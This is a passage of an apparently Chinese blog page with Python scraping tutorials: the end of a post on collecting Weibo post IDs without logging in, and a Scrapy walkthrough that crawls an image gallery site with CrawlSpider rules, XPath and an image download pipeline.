class="keyword">for</span> data <span class="keyword">in</span>  content.<span class="builtin-name">get</span>(<span class="string">'tabsInfo'</span>).<span class="builtin-name">get</span>(<span class="string">'tabs'</span>):</span><br><span class="line">            <span class="keyword">if</span> data.<span class="builtin-name">get</span>(<span class="string">'tab_type'</span>) == <span class="string">'weibo'</span>:</span><br><span class="line">                containerid = data.<span class="builtin-name">get</span>(<span class="string">'containerid'</span>)</span><br><span class="line">                <span class="builtin-name">print</span> <span class="string">'weibo request url containerid is %s'</span> % containerid</span><br><span class="line"></span><br><span class="line">        # construct the wei bo request url</span><br><span class="line">        <span class="keyword">if</span> containerid:</span><br><span class="line">            weibo_url = response.url + <span class="string">'&amp;containerid=%s'</span>%containerid</span><br><span class="line">            yield scrapy.Request(<span class="attribute">url</span>=weibo_url, <span class="attribute">callback</span>=self.get_weibo_id)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="builtin-name">print</span> <span class="string">'sorry, do not get containerid'</span></span><br><span class="line"></span><br><span class="line">    def get_weibo_id(self, response):</span><br><span class="line">        content = json.loads(response.body)</span><br><span class="line">        # <span class="builtin-name">get</span> weibo id ,you can also save some other data <span class="keyword">if</span> you need</span><br><span class="line">        <span class="keyword">for</span> data <span class="keyword">in</span> content.<span class="builtin-name">get</span>(<span class="string">'cards'</span>):</span><br><span class="line">            <span class="keyword">if</span> data.<span class="builtin-name">get</span>(<span class="string">'card_type'</span>) == 9:</span><br><span class="line">                single_weibo_id = data.<span class="builtin-name">get</span>(<span class="string">'mblog'</span>).<span class="builtin-name">get</span>(<span class="string">'id'</span>)</span><br><span class="line">                <span class="builtin-name">print</span> single_weibo_id</span><br><span class="line">                # here ,<span class="keyword">if</span> you want <span class="keyword">to</span> <span class="builtin-name">get</span> comment <span class="builtin-name">info</span> ,you can construct the comment url just the same as wei bo url</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h3 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h3>
                  <p>本文写到这里就算结束了，我一直信奉授人以鱼不如授人以渔，在这篇文章中，我并没有把全部的代码展示出来，而是通过分析的过程来让大家知道怎么去处理这类问题，在文中也留了好几个可以让大家发挥的地方，如用户关注用户怎么获取？按照关键词搜索的信息怎么抓取？等等。我相信大家通过一步步的抓包以及分析一定可以解决这些问题的。这些问题，在以后的博客中我也会继续更新的。</p>
                  <p>第一次写这样的博客，感觉还是驾驭不了，还是得多多练习。写博客真的很累，向大才致敬，感谢他无私的为我们奉献了这么多精彩的教程。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/四毛" class="author" itemprop="url" rel="index">四毛</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2017-05-04 12:56:51" itemprop="dateCreated datePublished" datetime="2017-05-04T12:56:51+08:00">2017-05-04</time>
                </span>
                <span id="/4465.html" class="post-meta-item leancloud_visitors" data-flag-title="免登录新浪微博爬虫系列之第一篇  单博主微博及评论数据" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>5.4k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>5 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/4421.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Python <i class="label-arrow"></i>
                  </a>
                  <a href="/4421.html" class="post-title-link" itemprop="url">小白进阶之Scrapy第四篇（图片下载管道篇）</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p><strong>PS： 爬虫不进入 img_url 函数的小伙伴儿 请尝试将将代码复制到你新建的 py 文件中。</strong> 2017/8/30 更新解决了网站防盗链导致下载图片失败的问题 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161021225948.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161021225948.jpg" alt=""></a> 这几天一直有小伙伴而给我吐槽说，由于妹子图站长把www.mzitu.com/all这个地址取消了。导致原来的那个采集爬虫不能用啦。 正好也有小伙伴儿问 Scrapy 中的图片下载管道是怎么用的。 就凑合在一起把 mzitu.com 给重新写了一下。 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/9555112.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/9555112.jpg" alt=""></a> 首先确保你的 Python 环境已安装 Scrapy!!!!!!!! 命令行下进入你需要存放项目的目录并创建项目： 比如我放在了 D:\PycharmProjects</p>
                  <figure class="highlight properties">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attr">D</span>:<span class="string"></span></span><br><span class="line"><span class="attr">cd</span> <span class="string">PycharmProjects</span></span><br><span class="line"><span class="attr">scrapy</span> <span class="string">startproject mzitu_scrapy</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>我是 Windows！其余系统的伙伴儿自己看着办哈。 这都不会的小伙伴儿，快去洗洗睡吧。养足了精神从头看一遍教程哈！ 在 PyCharm 中打开我们的项目目录。 在 mzitu_scrapy 目录创建 run.py。写入以下内容：</p>
                  <figure class="highlight smali">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">from scrapy.cmdline import execute</span><br><span class="line">execute(['scrapy', 'crawl', 'mzitu'])</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>其中的 mzitu 就为待会儿 spider.py 文件中的 name 属性。这点请务必记住哦！不然是跑不起来的。 在 mzitu_scrapy\spider 目录中创建 spider.py。文件作为爬虫文件。 好了！现在我们来想想，怎么来抓 mzitu.com 了。 首先我们的目标是当然是全站的妹子图片！！！ 但是问题来了，站长把之前那个 mzitu.com\all 这个 URL 地址给取消了，我们没办法弄到全部的套图地址了！ 我们可以去仔细观察一下站点所有套图的地址都是：<a href="http://www.mzitu.com/几位数字结尾的。" target="_blank" rel="noopener">http://www.mzitu.com/几位数字结尾的。</a> 这种格式地址。 有木有小伙伴儿想到了啥？ <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161022193315.gif" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161022193315.gif" alt=""></a> CrawlSpider ！！！就是这玩儿！！ 有了它我们就能追踪“<a href="http://www.mzitu.com/几位数字结尾的”这种格式的URL了。" target="_blank" rel="noopener">http://www.mzitu.com/几位数字结尾的”这种格式的URL了。</a> Go Go Go Go！开始搞事。 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/02/QQ图片20170205084843.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/02/QQ图片20170205084843.jpg" alt=""></a> 首先在 item.py 中新建我们需要的字段。我们需要啥？我们需要套图的名字和图片地址！！ 那我们新建三个字段：</p>
                  <figure class="highlight mipsasm">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">import <span class="keyword">scrapy</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">class </span>MzituScrapyItem(<span class="keyword">scrapy.Item):</span></span><br><span class="line"><span class="keyword"> </span>   <span class="comment"># define the fields for your item here like:</span></span><br><span class="line">    <span class="comment"># name = scrapy.Field()</span></span><br><span class="line">    name = <span class="keyword">scrapy.Field()</span></span><br><span class="line"><span class="keyword"> </span>   image_urls = <span class="keyword">scrapy.Field()</span></span><br><span class="line"><span class="keyword"> </span>   url = <span class="keyword">scrapy.Field()</span></span><br><span class="line"><span class="keyword"> </span>   pass</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>第一步完成啦！开始写 spider.py 啦！ 首先导入我们需要的包：</p>
                  <figure class="highlight pgsql">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">from</span> scrapy <span class="keyword">import</span> Request</span><br><span class="line"><span class="keyword">from</span> scrapy.spider <span class="keyword">import</span> CrawlSpider, <span class="keyword">Rule</span></span><br><span class="line"><span class="keyword">from</span> scrapy.linkextractors <span class="keyword">import</span> LinkExtractor</span><br><span class="line"><span class="keyword">from</span> mzitu_scrapy.items <span class="keyword">import</span> MzituScrapyItem</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>都是干啥的我不说了哈！不知道的小伙伴儿自己去翻翻官方文档。 接下来是：</p>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">class Spider(CrawlSpider):</span><br><span class="line">    name = <span class="string">'mzitu'</span></span><br><span class="line">    allowed_domains = [<span class="string">'mzitu.com'</span>]</span><br><span class="line">    start_urls = [<span class="string">'http://www.mzitu.com/'</span>]</span><br><span class="line">    img_urls = []</span><br><span class="line">    rules = (</span><br><span class="line">        Rule(LinkExtractor(allow=(<span class="string">'http://www.mzitu.com/\d&#123;1,6&#125;'</span>,), deny=(<span class="string">'http://www.mzitu.com/\d&#123;1,6&#125;/\d&#123;1,6&#125;'</span>)), <span class="attribute">callback</span>=<span class="string">'parse_item'</span>, <span class="attribute">follow</span>=<span class="literal">True</span>),</span><br><span class="line">    )</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>第五行的 img_urls=[] 这个列表是我们之后用来存储每个套图的全部图片的 URL 地址的。 rules 中的语句是：匹配<a href="http://www.mzitu.com/1至6位数的的URL（\\d：数字；{1,6}匹配1至6次。就能匹配出1到6位数）" target="_blank" rel="noopener">http://www.mzitu.com/1至6位数的的URL（\\d：数字；{1,6}匹配1至6次。就能匹配出1到6位数）</a> 但是我们会发现网页中除了<a href="http://www.mzitu.com/XXXXXXX" target="_blank" rel="noopener">http://www.mzitu.com/XXXXXXX</a> 这种格式的 URL 之外；还有 <a href="http://www.mzitu.com/XXXX/XXXX" target="_blank" rel="noopener">http://www.mzitu.com/XXXX/XXXX</a> 这个格式的 URL。所以我们需要设置 deny 来不匹配<a href="http://www.mzitu.com/XXXX/XXXX这种格式的URL。" target="_blank" rel="noopener">http://www.mzitu.com/XXXX/XXXX这种格式的URL。</a> 然后将匹配到的网页交给 parse_item 来处理。并且持续追踪 <strong>看这儿敲黑板！！划重点！！：：：</strong></p>
                  <h2 id="重点说明！！！！不能-parse-函数！！这是-CrawlSpider-进行匹配调用的函数，你要是使用了！rules-就没法进行匹配啦！！！"><a href="#重点说明！！！！不能-parse-函数！！这是-CrawlSpider-进行匹配调用的函数，你要是使用了！rules-就没法进行匹配啦！！！" class="headerlink" title="重点说明！！！！不能 parse 函数！！这是 CrawlSpider 进行匹配调用的函数，你要是使用了！rules 就没法进行匹配啦！！！"></a><strong>重点说明！！！！不能 parse 函数！！这是 CrawlSpider 进行匹配调用的函数，你要是使用了！rules 就没法进行匹配啦！！！</strong></h2>
                  <p>现在 spider.py 是这样的：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">from</span> scrapy <span class="keyword">import</span> Request</span><br><span class="line"><span class="keyword">from</span> scrapy.spider <span class="keyword">import</span> CrawlSpider, Rule</span><br><span class="line"><span class="keyword">from</span> scrapy.linkextractors <span class="keyword">import</span> LinkExtractor</span><br><span class="line"><span class="keyword">from</span> mzitu_scrapy.items <span class="keyword">import</span> MzituScrapyItem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Spider</span><span class="params">(CrawlSpider)</span>:</span></span><br><span class="line">    name = <span class="string">'mzitu'</span></span><br><span class="line">    allowed_domains = [<span class="string">'mzitu.com'</span>]</span><br><span class="line">    start_urls = [<span class="string">'http://www.mzitu.com/'</span>]</span><br><span class="line">    img_urls = []</span><br><span class="line">    rules = (</span><br><span class="line">        Rule(LinkExtractor(allow=(<span class="string">'http://www.mzitu.com/\d&#123;1,6&#125;'</span>,), deny=(<span class="string">'http://www.mzitu.com/\d&#123;1,6&#125;/\d&#123;1,6&#125;'</span>)), callback=<span class="string">'parse_item'</span>, follow=<span class="literal">True</span>),</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_item</span><span class="params">(self, response)</span>:</span></span><br><span class="line">        print(response.url)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>来跑一下试试 别忘了怎么测试的哈！！上面新建的那个 run.py！ <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/04/mzitu01.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/04/mzitu01.png" alt=""></a> Good！！真棒！全是我们想要的！！！ 现在干啥？啥？你不知道？EXM 你没逗我吧！ <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/04/e6a6e85d131a484b8034606c0f6a504a_th.gif" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/04/e6a6e85d131a484b8034606c0f6a504a_th.gif" alt=""></a> 当然是解析我们拿到的 response 了！从里面找我们要的套图名称和所有的图片地址了！ 我们随便打开一个 URL。 首先用 xpath 取套图名称： 啥？你不知道怎么用 xpath？？少年少女 你走吧。出去别说看过我的博文。 ./*//div[@class=’main’]/div[1]/h2/text() 这段 xpath 就是套图名称的 xpath 了！看不懂的少年少女赶快去<a href="http://www.w3school.com.cn/看看xpath的教程！" target="_blank" rel="noopener">http://www.w3school.com.cn/看看xpath的教程！</a> 当然你直接用 Chrome 拷贝出来的那个 xpath 也行。（有一定的概率不能使） 现在来找图片地址了，怎么找我在 小白爬虫第一弹中已经写过了哈！这就不详细赘述了！ 首先找到每套图有多少张图片： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/04/mzitu02.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/04/mzitu02.png" alt=""></a> 就是红框中的那个东东。 Xpath 这样写：</p>
                  <figure class="highlight delphi">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">descendant::<span class="keyword">div</span>[@<span class="keyword">class</span>=<span class="string">'main'</span>]/<span class="keyword">div</span>[@<span class="keyword">class</span>=<span class="string">'content'</span>]/<span class="keyword">div</span>[@<span class="keyword">class</span>=<span class="string">'pagenavi'</span>]/a[last()-<span class="number">1</span>]/span/text()</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>意思是选取根节点下面所有后代标签，在其中选取出 div[@class=’main’]下面的 div[@class=’content’]下面的/div[@class=’pagenavi’]下面的倒数第二个 a 标签 下面的 span 标签中的文本。（有点长哈哈哈哈哈！其实还可以短一些，我懒就不改了） 然后循环拼接处每张图片的的网页地址，现在 spider.py 是这样：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">from</span> scrapy <span class="keyword">import</span> Request</span><br><span class="line"><span class="keyword">from</span> scrapy.spider <span class="keyword">import</span> CrawlSpider, Rule</span><br><span class="line"><span class="keyword">from</span> scrapy.linkextractors <span class="keyword">import</span> LinkExtractor</span><br><span class="line"><span class="keyword">from</span> mzitu_scrapy.items <span class="keyword">import</span> MzituScrapyItem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Spider</span><span class="params">(CrawlSpider)</span>:</span></span><br><span class="line">    name = <span class="string">'mzitu'</span></span><br><span class="line">    allowed_domains = [<span class="string">'mzitu.com'</span>]</span><br><span class="line">    start_urls = [<span class="string">'http://www.mzitu.com/'</span>]</span><br><span class="line">    img_urls = []</span><br><span class="line">    rules = (</span><br><span class="line">        Rule(LinkExtractor(allow=(<span class="string">'http://www.mzitu.com/\d&#123;1,6&#125;'</span>,), deny=(<span class="string">'http://www.mzitu.com/\d&#123;1,6&#125;/\d&#123;1,6&#125;'</span>)), callback=<span class="string">'parse_item'</span>, follow=<span class="literal">True</span>),</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_item</span><span class="params">(self, response)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :param response: 下载器返回的response</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        item = MzituScrapyItem()</span><br><span class="line">        <span class="comment"># max_num为页面最后一张图片的位置</span></span><br><span class="line">        max_num = response.xpath(<span class="string">"descendant::div[@class='main']/div[@class='content']/div[@class='pagenavi']/a[last()-1]/span/text()"</span>).extract_first(default=<span class="string">"N/A"</span>)</span><br><span class="line">        item[<span class="string">'name'</span>] = response.xpath(<span class="string">"./*//div[@class='main']/div[1]/h2/text()"</span>).extract_first(default=<span class="string">"N/A"</span>)</span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">1</span>, int(max_num)):</span><br><span class="line">            <span class="comment"># page_url 为每张图片所在的页面地址</span></span><br><span class="line">            page_url = response.url + <span class="string">'/'</span> + str(num)</span><br><span class="line">            <span class="keyword">yield</span> Request(page_url, callback=self.img_url)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>extract_first(default=”N/A”)的意思是：取 xpath 返回值的第一个元素。如果 xpath 没有取到值，则返回 N/A 然后调用函数 img_url 来提取每个网页中的图片地址。img_url 长这样：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">img_url</span><span class="params">(self, response,)</span>:</span></span><br><span class="line">    <span class="string">"""取出图片URL 并添加进self.img_urls列表中</span></span><br><span class="line"><span class="string">    :param response:</span></span><br><span class="line"><span class="string">    :param img_url 为每张图片的真实地址</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    img_urls = response.xpath(<span class="string">"descendant::div[@class='main-image']/descendant::img/@src"</span>).extract()</span><br><span class="line">    <span class="keyword">for</span> img_url <span class="keyword">in</span> img_urls:</span><br><span class="line">        self.img_urls.append(img_url)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>descendant::div[@class=’main-image’]/descendant::img/@src 这段 xpath 取出 div[@class=’main-image’]下面所有的 img 标签的 src 属性（有的套图一个页面有好几张图） .extract()不跟上[0]返回的是列表 完整的 spider.py 如下：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">from</span> scrapy <span class="keyword">import</span> Request</span><br><span class="line"><span class="keyword">from</span> scrapy.spider <span class="keyword">import</span> CrawlSpider, Rule</span><br><span class="line"><span class="keyword">from</span> scrapy.linkextractors <span class="keyword">import</span> LinkExtractor</span><br><span class="line"><span class="keyword">from</span> mzitu_scrapy.items <span class="keyword">import</span> MzituScrapyItem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Spider</span><span class="params">(CrawlSpider)</span>:</span></span><br><span class="line">    name = <span class="string">'mzitu'</span></span><br><span class="line">    allowed_domains = [<span class="string">'mzitu.com'</span>]</span><br><span class="line">    start_urls = [<span class="string">'http://www.mzitu.com/'</span>]</span><br><span class="line">    img_urls = []</span><br><span class="line">    rules = (</span><br><span class="line">        Rule(LinkExtractor(allow=(<span class="string">'http://www.mzitu.com/\d&#123;1,6&#125;'</span>,), deny=(<span class="string">'http://www.mzitu.com/\d&#123;1,6&#125;/\d&#123;1,6&#125;'</span>)), callback=<span class="string">'parse_item'</span>, follow=<span class="literal">True</span>),</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_item</span><span class="params">(self, response)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :param response: 下载器返回的response</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        item = MzituScrapyItem()</span><br><span class="line">        <span class="comment"># max_num为页面最后一张图片的位置</span></span><br><span class="line">        max_num = response.xpath(<span class="string">"descendant::div[@class='main']/div[@class='content']/div[@class='pagenavi']/a[last()-1]/span/text()"</span>).extract_first(default=<span class="string">"N/A"</span>)</span><br><span class="line">        item[<span class="string">'name'</span>] = response.xpath(<span class="string">"./*//div[@class='main']/div[1]/h2/text()"</span>).extract_first(default=<span class="string">"N/A"</span>)</span><br><span class="line">        item[<span class="string">'url'</span>] = response.url</span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">1</span>, int(max_num)):</span><br><span class="line">            <span class="comment"># page_url 为每张图片所在的页面地址</span></span><br><span class="line">            page_url = response.url + <span class="string">'/'</span> + str(num)</span><br><span class="line">            <span class="keyword">yield</span> Request(page_url, callback=self.img_url)</span><br><span class="line">        item[<span class="string">'image_urls'</span>] = self.img_urls</span><br><span class="line">        <span class="keyword">yield</span> item</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">img_url</span><span class="params">(self, response,)</span>:</span></span><br><span class="line">        <span class="string">"""取出图片URL 并添加进self.img_urls列表中</span></span><br><span class="line"><span class="string">        :param response:</span></span><br><span class="line"><span class="string">        :param img_url 为每张图片的真实地址</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        img_urls = response.xpath(<span class="string">"descendant::div[@class='main-image']/descendant::img/@src"</span>).extract()</span><br><span class="line">        <span class="keyword">for</span> img_url <span class="keyword">in</span> img_urls:</span><br><span class="line">            self.img_urls.append(img_url)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>下面开始把图片弄回本地啦！！ 开写我们的 pipelines.py 首先根据官方文档说明我们如果需要使用图片管道 则需要使用 ImagesPipeline： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/04/mzitu03.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/04/mzitu03.png" alt=""></a> 我们可以依葫芦画瓢写一个。但是这样有一个很麻烦的问题就是，这样下载下来的图片没有分类，很是难看啊！ 所以 我们需要重写一下 ImagesPipeline 中的 file_path 方法！ 具体如下：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Define your item pipelines here</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Don't forget to add your pipeline to the ITEM_PIPELINES setting</span></span><br><span class="line"><span class="comment"># See: http://doc.scrapy.org/en/latest/topics/item-pipeline.html</span></span><br><span class="line"><span class="keyword">from</span> scrapy <span class="keyword">import</span> Request</span><br><span class="line"><span class="keyword">from</span> scrapy.pipelines.images <span class="keyword">import</span> ImagesPipeline</span><br><span class="line"><span class="keyword">from</span> scrapy.exceptions <span class="keyword">import</span> DropItem</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MzituScrapyPipeline</span><span class="params">(ImagesPipeline)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">file_path</span><span class="params">(self, request, response=None, info=None)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :param request: 每一个图片下载管道请求</span></span><br><span class="line"><span class="string">        :param response:</span></span><br><span class="line"><span class="string">        :param info:</span></span><br><span class="line"><span class="string">        :param strip :清洗Windows系统的文件夹非法字符，避免无法创建目录</span></span><br><span class="line"><span class="string">        :return: 